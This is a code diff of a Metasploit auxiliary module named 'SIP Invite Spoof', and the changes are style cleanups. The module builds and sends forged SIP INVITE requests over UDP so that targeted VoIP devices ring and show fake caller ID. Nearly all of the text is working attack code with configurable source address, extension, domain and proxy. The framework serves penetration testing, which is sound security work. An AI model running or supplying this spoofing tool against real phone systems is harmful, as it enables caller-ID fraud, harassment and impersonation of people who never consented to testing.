@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -6,44 +7,43 @@
 require 'msf/core'
 
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Exploit::Remote::Udp
   include Msf::Auxiliary::Scanner
 
   def initialize
     super(
       'Name'           => 'SIP Invite Spoof',
-      'Description'    => %q{
+      'Description'    => %q(
         This module will create a fake SIP invite request making the targeted device ring
         and display fake caller id information.
-      },
-      'Author'         =>
+      ),
+      'Author' =>
         [
           'David Maynor <dave[at]erratasec.com>', # original module
           'ChrisJohnRiley' # modifications
         ],
-      'License'        =>  MSF_LICENSE
+      'License' => MSF_LICENSE
     )
 
-    deregister_options('Proxies','SSL','RHOST')
+    deregister_options('Proxies', 'SSL', 'RHOST')
     register_options(
       [
         Opt::RPORT(5060),
-        OptString.new('SRCADDR', [true, "The sip address the spoofed call is coming from",'192.168.1.1']),
-        OptString.new('MSG', [true, "The spoofed caller id to send","The Metasploit has you"]),
+        OptString.new('SRCADDR', [true, "The sip address the spoofed call is coming from", '192.168.1.1']),
+        OptString.new('MSG', [true, "The spoofed caller id to send", "The Metasploit has you"]),
         OptString.new('EXTENSION', [false, "The specific extension or name to target", nil]),
         OptString.new('DOMAIN', [false, "Use a specific SIP domain", nil])
-      ], self.class)
+      ], self.class
+    )
     register_advanced_options(
       [
         OptAddress.new('SIP_PROXY_NAME', [false, "Use a specific SIP proxy", nil]),
         OptPort.new('SIP_PROXY_PORT', [false, "SIP Proxy port to use", 5060])
-      ], self.class)
+      ], self.class
+    )
   end
 
-
   def run_host(ip)
-
     begin
 
       name = datastore['MSG']
@@ -54,20 +54,20 @@ class MetasploitModule < Msf::Auxiliary
       spport = datastore['SIP_PROXY_PORT'] || 5060
       conn_string = ''
 
-      if not ext.nil? and not ext.empty?
+      if !ext.nil? && !ext.empty?
         # set extesion name/number
         conn_string = "#{ext}@"
       end
 
-      if not dom.nil? and not dom.empty?
-        # set domain
-        conn_string << "#{dom}"
-      else
-        conn_string << "#{ip}"
-      end
+      conn_string << if !dom.nil? && !dom.empty?
+                       # set domain
+                       dom.to_s
+                     else
+                       ip.to_s
+                     end
 
       # set Route header if SIP_PROXY is set
-      if not sphost.nil? and not sphost.empty?
+      if !sphost.nil? && !sphost.empty?
         route = "Route: <sip:#{sphost}:#{spport};lr>\r\n"
       end
 
@@ -82,9 +82,9 @@ class MetasploitModule < Msf::Auxiliary
       req << "To: <sip:#{conn_string}>" + "\r\n"
       req << "Via: SIP/2.0/UDP #{ip}" + "\r\n"
       req << "From: \"#{name}\"<sip:#{src}>" + "\r\n"
-      req << "Call-ID: #{(rand(100)+100)}#{ip}" + "\r\n"
+      req << "Call-ID: #{(rand(100) + 100)}#{ip}" + "\r\n"
       req << "CSeq: 1 INVITE" + "\r\n"
-      req << "Max-Forwards: 20" +  "\r\n"
+      req << "Max-Forwards: 20" + "\r\n"
       req << "Contact: <sip:#{conn_string}>" + "\r\n\r\n"
 
       udp_sock.put(req)
@@ -92,6 +92,5 @@ class MetasploitModule < Msf::Auxiliary
 
     rescue Errno::EACCES
     end
-
   end
 end
